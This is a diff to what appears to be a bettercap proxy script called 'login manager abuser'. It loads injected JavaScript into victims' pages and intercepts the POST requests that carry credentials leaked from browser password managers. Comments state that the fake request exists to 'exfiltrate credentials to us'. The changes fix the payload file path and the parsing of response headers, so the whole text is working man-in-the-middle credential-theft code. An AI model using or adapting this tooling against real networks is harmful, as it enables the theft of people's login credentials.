@@ -12,8 +12,8 @@
 var AbuserJavascript = "";
 
 function onLoad() {
-    // log( "Loading abuser code from caplets/login-man-abuser.js" );
-    AbuserJavascript = readFile("caplets/login-man-abuser.js")
+    // log( "Loading abuser code from login-man-abuser.js" );
+    AbuserJavascript = readFile("/usr/local/share/bettercap/caplets/login-man-abuser.js")
 }
 
 // here we intercept the ajax POST request with leaked credentials.
@@ -22,8 +22,10 @@ function onRequest(req, res) {
         log( "[LOGIN MANAGER ABUSER]\n", req.ReadBody() );
         // this was just a fake request we needed to exfiltrate
         // credentials to us, drop the connection with an empty 200.
-        for (var i = 0; i < res.Headers.length; i++) {
-            res.RemoveHeader(res.Headers[i].Name);
+        headers = res.Headers.split("\r\n");
+        for (var i = 0; i < headers.length; i++) {
+            header_name = headers[i].replace(/:.*/, "");
+            res.RemoveHeader(header_name);
         }
         res.SetHeader("Connection", "close");
         res.Status      = 200;
